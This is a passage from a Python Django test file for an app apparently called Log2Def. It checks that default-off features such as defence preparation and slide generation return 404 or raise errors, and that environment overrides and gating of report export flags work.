        self.assertFalse(data['advanced_analytics'])
        self.assertFalse(data['ai_chat_assistant'])

        # Confirm critical MVP flags are ON by default
        self.assertTrue(data['logbook_camera_capture'])
        self.assertTrue(data['logbook_bulk_upload'])
        self.assertTrue(data['logbook_pdf_upload'])
        self.assertTrue(data['ocr_extraction'])
        self.assertTrue(data['report_generation'])
        self.assertTrue(data['report_editor'])
        self.assertTrue(data['report_docx_export'])
        self.assertTrue(data['report_pdf_export'])

    def test_disabled_feature_endpoints_return_404(self):
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')

        # 1. Defence generate
        resp_gen = self.client.post(f'/api/projects/{self.project1.id}/defence/generate/')
        self.assertEqual(resp_gen.status_code, status.HTTP_404_NOT_FOUND)
        self.assertIn("Feature 'defence_preparation' is disabled", str(resp_gen.data))

        # 2. Defence questions list
        resp_qs = self.client.get(f'/api/projects/{self.project1.id}/defence/questions/')
        self.assertEqual(resp_qs.status_code, status.HTTP_404_NOT_FOUND)

        # 3. Defence question detail
        resp_q_detail = self.client.patch(f'/api/projects/{self.project1.id}/defence/questions/1/')
        self.assertEqual(resp_q_detail.status_code, status.HTTP_404_NOT_FOUND)

        # 4. Defence session
        resp_session = self.client.post(f'/api/projects/{self.project1.id}/defence/session/')
        self.assertEqual(resp_session.status_code, status.HTTP_404_NOT_FOUND)

        # 5. Defence slides (slide_generation flag)
        resp_slides_get = self.client.get(f'/api/projects/{self.project1.id}/defence/slides/')
        self.assertEqual(resp_slides_get.status_code, status.HTTP_404_NOT_FOUND)
        self.assertIn("Feature 'slide_generation' is disabled", str(resp_slides_get.data))

        resp_slides_post = self.client.post(f'/api/projects/{self.project1.id}/defence/slides/')
        self.assertEqual(resp_slides_post.status_code, status.HTTP_404_NOT_FOUND)

        # 6. Defence script
        resp_script_get = self.client.get(f'/api/projects/{self.project1.id}/defence/script/')
        self.assertEqual(resp_script_get.status_code, status.HTTP_404_NOT_FOUND)

        resp_script_post = self.client.post(f'/api/projects/{self.project1.id}/defence/script/')
        self.assertEqual(resp_script_post.status_code, status.HTTP_404_NOT_FOUND)

    def test_disabled_feature_generators_raise_runtime_error(self):
        # Direct calls to background generation functions must refuse to run
        with self.assertRaises(RuntimeError) as ctx1:
            generate_defence_questions(self.project1)
        self.assertIn("defence_preparation' is disabled", str(ctx1.exception))

        with self.assertRaises(RuntimeError) as ctx2:
            generate_presentation_slides(self.project1)
        self.assertIn("slide_generation' is disabled", str(ctx2.exception))

        with self.assertRaises(RuntimeError) as ctx3:
            generate_presentation_script(self.project1)
        self.assertIn("defence_preparation' is disabled", str(ctx3.exception))

    def test_feature_flag_env_override(self):
        import os
        from .feature_flags import is_feature_enabled

        # Default is False
        self.assertFalse(is_feature_enabled('defence_preparation'))

        # Set env override
        os.environ['LOG2DEF_FLAG_DEFENCE_PREPARATION'] = 'true'
        try:
            self.assertTrue(is_feature_enabled('defence_preparation'))
        finally:
            del os.environ['LOG2DEF_FLAG_DEFENCE_PREPARATION']

    def test_core_mvp_flags_can_be_gated(self):
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {self.token1}')

        with patch('api.feature_flags.is_feature_enabled', side_effect=lambda flag: False if flag == 'report_docx_export' else True):
            docx_resp = self.client.get(f'/api/projects/{self.project1.id}/export/docx/')
            self.assertEqual(docx_resp.status_code, status.HTTP_404_NOT_FOUND)
            self.assertIn("Feature 'report_docx_export' is disabled", str(docx_resp.data))

        with patch('api.feature_flags.is_feature_enabled', side_effect=lambda flag: False if flag == 'report_pdf_export' else True):
            pdf_resp = self.client.get(f'/api/projects/{self.project1.id}/export/pdf/')
            self.assertEqual(pdf_resp.status_code, status.HTTP_404_NOT_FOUND)
            self.assertIn("Feature 'report_pdf_export' is disabled", str(pdf_resp.data))

        with patch('api.feature_flags.is_feature_enabled', side_effect=lambda flag: False if flag == 'report_generation' else True):
            gen_resp = self.client.post(f'/api/projects/{self.project1.id}/report/generate/', {})
            self.assertEqual(gen_resp.status_code, status.HTTP_404_NOT_FOUND)
            self.assertIn("Feature 'report_generation' is disabled", str(gen_resp.data))


